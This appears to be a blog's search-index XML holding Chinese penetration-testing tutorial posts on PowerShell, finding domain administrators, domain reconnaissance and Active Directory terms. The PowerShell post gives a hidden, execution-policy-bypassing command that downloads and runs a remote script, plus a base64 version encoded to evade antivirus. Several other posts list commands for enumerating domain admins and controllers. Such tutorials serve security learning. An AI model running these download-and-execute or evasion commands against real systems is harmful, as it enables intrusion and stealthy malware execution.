<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Powershell</title>
      <link href="/2022/10/13/Powershell/"/>
      <url>/2022/10/13/Powershell/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍">介绍</h3><p>PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 PowerShell 还能做很多 cmd 不能做的事情。</p><p>PowerShell 内置在 Windows 7、Windows Server 2008 R2 及更高版本的 Windows 系统中，同时 PowerShell 是构建在 .NET 平台上的，所有命令传递的都是 .NET 对象。</p><p>PowerShell 有如下特点：</p><ul><li>Windows 7 以上的操作系统默认安装</li><li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li><li>可以从另一个系统中下载 PowerShell 脚本并执行</li><li>目前很多工具都是基于 PowerShell 开发的</li><li>很多安全软件检测不到 PowerShell 的活动</li><li>cmd 通常会被阻止运行，但是 PowerShell 不会</li><li>可以用来管理活动目录</li></ul><p>可输入 Get-Host 或者 $PSVersionTable 查看 PowerShell 版本：</p><img src="/2022/10/13/Powershell/image-20221013165216253.png" alt="image-20221013165216253" style="zoom:50%;"><img src="/2022/10/13/Powershell/image-20221013165318603.png" alt="image-20221013165318603" style="zoom:50%;"><p>Windows 操作系统对应的 PowerShell 版本信息：</p><p>1.0     windows server 2008</p><p>2.0     windows server 2008 r2、windows 7</p><p>3.0     windows server 2012、windows 8</p><p>4.0     windows server 2012 r2、windows 8.1</p><p>5.0     windows 10</p><p>5.1     windows server 2016</p><h3 id="基本介绍">基本介绍</h3><ul><li>ps1文件</li></ul><p>​ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件。</p><ul><li><p>执行策略</p><p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式<code>Restricted</code>。</p><p>使用 <code>Get-ExecutionPolicy</code>命令查看当前执行策略</p><img src="/2022/10/13/Powershell/image-20221013165958649.png" alt="image-20221013165958649" style="zoom:50%;"><p>执行策略有以下几种：</p><p><strong>Restricted</strong>：不能运行脚本</p><p><strong>RemoteSigned</strong>：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p><p><strong>AllSigned</strong>：仅当脚本由受信任的发布者签名才能运行。</p><p><strong>Unrestricted</strong>：脚本执行不受限制，不管来自哪里，也不管它们是否有签名。</p><p>使用<code>Set-ExecutionPolicy &lt;policy name&gt;</code>设置执行策略，该命令需要管理员权限</p><img src="/2022/10/13/Powershell/image-20221013170431690.png" alt="image-20221013170431690" style="zoom:50%;"></li><li><p>运行脚本</p><p>PowerShell 运行脚本的方式和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行</p></li><li><p>管道</p></li></ul><p>​PowerShell 中的管道类似于 linux 中的管道，都是将前一个命令的输出作为另一个命令的输入，两个命令之间使用 “|” 进行连接。</p><p>​例如，在 PowerShell 中获取进程信息并以程序 ID 进行排序</p><img src="/2022/10/13/Powershell/image-20221013171111464.png" alt="image-20221013171111464" style="zoom:50%;"><h3 id="一些命令">一些命令</h3><blockquote><p>-NoLogo：启动不显示版权标志的PowerShell</p><p>-WindowStyle Hidden (-W Hidden)：隐藏窗口</p><p>-NoProfile (-NoP)：不加载当前用户的配置文件</p><p>–Enc：执行 base64 编码后的 powershell 脚本字符串</p><p>-ExecutionPolicy Bypass (-Exec Bypass) ：绕过执行安全策略</p><p>-Noexit：执行后不退出Shell，这在使用键盘记录等脚本时非常重要</p><p>-NonInteractive (-Nonl)：非交互模式，PowerShell 不为用户提供交互的提示</p></blockquote><p>在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式，如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等。PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls 。</p><ul><li><p>文件操作类命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">新建目录test：New-Item test -ItemType directory</span><br><span class="line">删除目录test：Remove-Item test</span><br><span class="line">新建文件test.txt：New-Item test.txt -ItemType file</span><br><span class="line">新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value &quot;hello&quot;</span><br><span class="line">删除文件test.txt：Remove-Item test.txt</span><br><span class="line">查看文件test.txt内容：Get-Content  test.txt</span><br><span class="line">设置文件test.txt内容t：Set-Content  test.txt  -Value &quot;hello&quot;</span><br><span class="line">给文件test.txt追加内容：Add-Content test.txt  -Value &quot;,word!&quot;</span><br><span class="line">清除文件test.txt内容：Clear-Content test.txt</span><br></pre></td></tr></table></figure></li><li><p>绕过本地权限并执行</p><p>上面说到了默认情况下 PowerShell 的执行策略是受限模式<code>Restricted</code>，这就导致了在渗透测试过程中我们需要采用一些方法绕过这个策略，从而执行我们的脚本文件。</p><p>先来看看默认受限模式下执行脚本的情况</p><img src="/2022/10/13/Powershell/image-20221013172448111.png" alt="image-20221013172448111" style="zoom:50%;"></li></ul><p>这里系统会提示在此系统上禁止运行脚本，但加上 <code>-ExecutionPolicy Bypass</code>即可绕过这个限制</p><img src="/2022/10/13/Powershell/image-20221013173324661.png" alt="image-20221013173324661" style="zoom:50%;"><ul><li><p>绕过本地权限并隐藏执行</p><p>加入<code>-WindowStyle Hidden -NoLogo -NonInteractive -NoProfile</code> 即可隐藏执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.1.10.7:8000/test.ps1&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>或者简写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.1.10.7:8000/test.ps1&#x27;)&quot;</span><br></pre></td></tr></table></figure></li><li><p>利用base64对命令进行编码</p><p>使用 Base64 进行编码主要是为了混淆代码以避免被杀毒软件查杀，经过尝试这里直接使用 Base64 编码是不行的，可以使用 Github 上的一个编码工具，<a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">工具下载地址</a></p><p>下载好后，需要先将要执行的命令保存到文本文件中，这里保存到了 tmp.txt 文本中，之后执行 <code>python ps_encoder.py -s tmp.txt</code> 即可</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;cat tmp.txt</span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.1.10.7:8000/test.ps1&#x27;)</span><br><span class="line"></span><br><span class="line">&gt;python ps_encoder.py -s tmp.txt</span><br><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 –Enc 指定 Base64 编码内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>定位域管理员</title>
      <link href="/2022/10/13/Locate_domain_administrators/"/>
      <url>/2022/10/13/Locate_domain_administrators/</url>
      
        <content type="html"><![CDATA[<h3 id="psloggedon">psloggedon</h3><blockquote><p>PSLoggedOn需要启动Remote Registry Service</p></blockquote><p>在 Windows 上使用 net session 可以查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户。</p><p>PsLoggedOn对本地登录用户的定义是将其配置文件加载到注册表中，因此PsLoggedOn通过扫描 HKEY_USERS 键下的键来确定谁登录。对于名称为用户 SID（安全标识符）的每个密钥， PsLoggedOn 会查找相应的用户名并显示它。为了确定谁通过资源共享登录到计算机， PsLoggedOn使用NetSessionEnum API。请注意，PsLoggedOn将显示您已通过资源共享登录到您查询的远程计算机，因为PsLoggedOn需要登录才能访问远程系统的注册表。</p><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">psloggedon 下载地址</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe [-] [-l] [-x] [\\computername|username]</span><br><span class="line"></span><br><span class="line">-                                显示支持的选项和用于输出值的单位。</span><br><span class="line">-l                            仅显示本地登录，不显示本地和网络资源登录。</span><br><span class="line">-x                            不显示登录时间。</span><br><span class="line">\\computername    指定要列出登录信息的计算机的名称。</span><br><span class="line">Username                指定用户名，在网络中搜索该用户登录的计算机。</span><br></pre></td></tr></table></figure><p>-l        仅显示本地登录，不显示本地和网络资源登录。</p><img src="/2022/10/13/Locate_domain_administrators/1665306871466-e4c4e8b1-10f7-4c8c-840b-3997588f2118.png" alt="image-20221013142018112" style="zoom:50%;"><p>\computername    指定要列出登录信息的计算机的名称。</p><img src="/2022/10/13/Locate_domain_administrators/1665307541478-9cba8196-82f6-4442-b587-a14b9f6a8a9b.png" alt="image-20221013142018112" style="zoom:50%;"><img src="/2022/10/13/Locate_domain_administrators/1665307570106-ab4de206-fe45-4414-acd8-a067605973e0.png" alt="image-20221013142018112" style="zoom:50%;"><p>Username                指定用户名，在网络中搜索该用户登录的计算机。</p><blockquote><p>踩坑：计算机得启用网络发现</p></blockquote><img src="/2022/10/13/Locate_domain_administrators/1665309006991-3fd5f405-5266-42b7-9762-ed6982eee095.png" alt="image.png" style="zoom:50%;"><h3 id="PVEFindADUser">PVEFindADUser</h3><p>pveFindADUser.exe 可用于查找 Active Directory 用户登录的位置，枚举域用户，以及查找在 特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务和计划任务的用户账 户。<a href="http://xn--h6qa856gr9i7gt25f29hpp0avncmwhjva898axqx.NET">运行该工具的计算机需要具有.NET</a> Framework 2.0，并且需要具有管理员权限。</p><p><a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">PVEFindADUser 下载地址</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-h                    显示帮助信息</span><br><span class="line">-u                    检测程序是否有新版本</span><br><span class="line">-current [&quot;username&quot;] -current参数显示每台PC上当前登录的用户在域中。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC</span><br><span class="line">-noping               阻止尝试枚举用户登录名之前对目标计算机执行ping命令</span><br><span class="line">-target               此可选参数允许您指定要查询的主机。如果未指定此-target参数，则将查询当前域中的所有主机。如果决定指定-target，然后指定以逗号分隔的主机名。查询结果将被输出到report.csv文件中</span><br></pre></td></tr></table></figure><p>获取所有目标计算机上当前登录的所有用户<br>pveFindADUser.exe -current</p><img src="/2022/10/13/Locate_domain_administrators/1665390263544-737a46f3-5bae-4226-95c1-7a71000e7da8.png?x-oss-process=image%2Fresize%2Cw_1008%2Climit_0" alt="image.png" style="zoom:50%;"><p>指定了用户名(DOMAIN\Username)，则显示该用户登录的计算机<br>pveFindADUser.exe -current fzm\lisi</p><img src="/2022/10/13/Locate_domain_administrators/1665391464891-d15d7aa1-2160-4b38-b80e-ab063c411da8.png?x-oss-process=image%2Fresize%2Cw_1006%2Climit_0" alt="image.png" style="zoom:50%;"><h3 id="netview">netview</h3><p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。</p><p><a href="https://github.com/mubix/netview">Netview 下载地址</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-h               显示帮助信息</span><br><span class="line">-f filename.txt  指定要提取主机列表的文件</span><br><span class="line">-e filename.txt  指定要排除的主机名的文件</span><br><span class="line">-o filename.txt  将所有输出重定向到指定的文件</span><br><span class="line">-d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表</span><br><span class="line">-g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索</span><br><span class="line">-c               对已找到的共享目录/文件的访问权限进行检查</span><br><span class="line">-i interval      枚举主机之间等待的秒数</span><br><span class="line">-j jitter        应用于间隔的抖动百分比（0.0-1.0）</span><br></pre></td></tr></table></figure><img src="/2022/10/13/Locate_domain_administrators/image-20221013142018112.png" alt="image-20221013142018112" style="zoom:50%;"><h3 id="NSE-脚本">NSE 脚本</h3><p>常用的 NSE 脚本如下：</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-domains.nse">smb-enum-domains.nse</a>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-users.nse">smb-enum-users.nse</a>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-shares.nse">smb-enum-shares.nse</a>:遍历远程主机的共享目录</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-processes.nse">smb-enum-processes.nse</a>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-enum-sessions.nse">smb-enum-sessions.nse</a>:获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p><p><a href="https://svn.nmap.org/nmap/scripts/smb-os-discovery.nse">smb-os-discovery.nse</a>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p><img src="/2022/10/13/Locate_domain_administrators/image-20221013151208602.png" alt="image-20221013151208602" style="zoom:50%;"><h3 id="PowerView-脚本">PowerView 脚本</h3><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code>$Env:PSModulePath</code>查看，我这里将其复制到了C:\Program Files\WindowsPowerShell\Modules文件夹内。</p><p>接着在 powershell中输入<code>Import-Module PowerView</code>即可导入PowerView，使用<code>Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p><p><a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">PowerView 脚本下载地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域内信息收集</title>
      <link href="/2022/10/13/Intra-domain_information_collection/"/>
      <url>/2022/10/13/Intra-domain_information_collection/</url>
      
        <content type="html"><![CDATA[<h3 id="判断是否存在域">判断是否存在域</h3><ul><li>ifconfig</li></ul><p>查看网关 IP 地址、DNS 的 IP 地址、域名、本机是否和 DNS 服务器处于同一网段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/image-20221013103430393.png" alt="image-20221013103430393"><br>接着使用 nslookup 解析域名的 IP 地址，查看是否与 DNS 服务器为同一 IP<br><img src="/2022/10/13/Intra-domain_information_collection/image-20221013103501517.png" alt="image-20221013103501517"></p><ul><li>系统详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665303896642-04459935-5a9e-4d75-89e6-3438668c5f68.png" alt="image.png"></p><ul><li>当前登录域与域用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665303846049-dbf18c49-6245-4240-a739-e7dbedc63fea.png" alt="image.png"></p><ul><li>判断主域</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665303931947-0bf1e5c6-b1f9-46be-ba38-3ffd82085bea.png" alt="image.png"></p><h3 id="收集域内基础信息">收集域内基础信息</h3><ul><li>查看域</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><ul><li>查看域内计算机</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:domain_name</span><br></pre></td></tr></table></figure><ul><li>查看域内用户组列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665303685975-daa91283-3d11-4fcc-8c3a-78caa70581c8.png" alt="image.png"></p><ul><li>查看域用户组信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Enterprise Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304025868-53b09d01-c2fd-4487-af0e-7fea3a90e897.png" alt="image.png"></p><ul><li>查看域密码策略信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304059956-323a4cdd-f0e6-47cf-a121-59755776408b.png" alt="image.png"></p><ul><li>查看域信任信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304109275-c8f0067a-017a-498d-978c-f3962ac88ca7.png" alt="image.png"></p><h3 id="收集域用户和管理员信息">收集域用户和管理员信息</h3><ul><li>查询域用户列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304170728-669ac8ea-d8ec-4a3b-995a-e2ac68a8f7dc.png" alt="image.png"></p><ul><li>查询域用户详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure><ul><li>查询存在的用户，dsquery命令需要在域控上运行</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304508449-4870f9b9-de10-4d99-bd8d-f7677255f724.png" alt="image.png"><br>常用的 dsquery 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer - 查找目录中的计算机</span><br><span class="line">dsquery contact - 查找目录中的联系人</span><br><span class="line">dsquery subnet - 查找目录中的子网</span><br><span class="line">dsquery group - 查找目录中的组</span><br><span class="line">dsquery ou - 查找目录中的组织单位</span><br><span class="line">dsquery site - 查找目录中的站点</span><br><span class="line">dsquery server - 查找目录中的域控制器</span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line">dsquery quota - 查找目录中的配额</span><br><span class="line">dsquery partition - 查找目录中的分区</span><br><span class="line">dsquery * - 用通用的 LDAP 查询查找目录中的任何对象</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304613101-cfb585e7-4e5a-47e2-9135-17b870810511.png" alt="image.png"></p><p><img src="/2022/10/13/Intra-domain_information_collection/1665304745790-12d460b6-132b-4817-aa4d-2846c651bc6e.png" alt="image.png"></p><h3 id="查找域控制器">查找域控制器</h3><ul><li>查看域控器机器名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:fzm.com</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304872563-8496491f-bbdb-41b4-a1a5-4f62692f57dc.png" alt="image.png"></p><ul><li>查看域控器主机名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=SRV _ldap._tcp</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665305173306-40fede56-3fbd-4e66-98de-4492579b3dca.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdom query pdc   //需要在域控上执行</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304977673-5f9ec9f2-e393-4f94-8d1e-2ab2812e3ac7.png" alt="image.png"></p><ul><li>查看域控器组</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665305257385-be808558-2986-4b33-87d2-3a15003202ef.png" alt="image.png"></p><h3 id="查找域管理员进程">查找域管理员进程</h3><ul><li>获取域管理员列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665383177494-e4ffdfc1-234e-4f76-bd0f-22ec5f147e6e.png" alt="image.png"></p><ul><li>列出本机的所有进程及进程用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure><p>如果在列出的进程中看到了用户名为管理员用户名的话，便是找到了域管理员进程。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网中常见名词解释</title>
      <link href="/2022/10/13/Explanatio_of_common_terms_in_the_intranet/"/>
      <url>/2022/10/13/Explanatio_of_common_terms_in_the_intranet/</url>
      
        <content type="html"><![CDATA[<h3 id="工作组">工作组</h3><p><strong>工作组</strong> Work Group 是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。<br>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。<br>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。<br>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。<br>所以对于管理者而言，工作组的管理方式有时会不太便于管理，这时候就需要了解域的概念了。</p><h3 id="域-domain">域 domain</h3><p>可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。<br>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p><h3 id="域控制器-Domain-Controller">域控制器 Domain Controller</h3><p>简写为 DC，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。<br>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。<br>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。<br>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p><h3 id="父域和子域">父域和子域</h3><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p><h3 id="域树">域树</h3><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。<br>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，<a href="http://xn--child-mt3iw1h.Microsoft.com">如域child.Microsoft.com</a> 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。<br>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。<br>多个域树可以组成一个域林。</p><h3 id="域林">域林</h3><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。<br>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道<strong>Kerberos信任关系</strong>，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.<br><a href="http://xn--benet-gv5ij80i.com.cn">比如benet.com.cn</a>,<a href="http://xn--accp-k84fzc0jl1d32ova062c9jy86gfdifv7a053c.com.cn">则可以创建同属与一个林的accp.com.cn</a>,他们就在同一个域林里.<br>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。<br>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p><h3 id="活动目录">活动目录</h3><p>活动目录 Active Directory ，简写为 AD，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。<br>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。<br>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p><h3 id="DMZ">DMZ</h3><p>DMZ demilitarized zone ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。<br>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p><h3 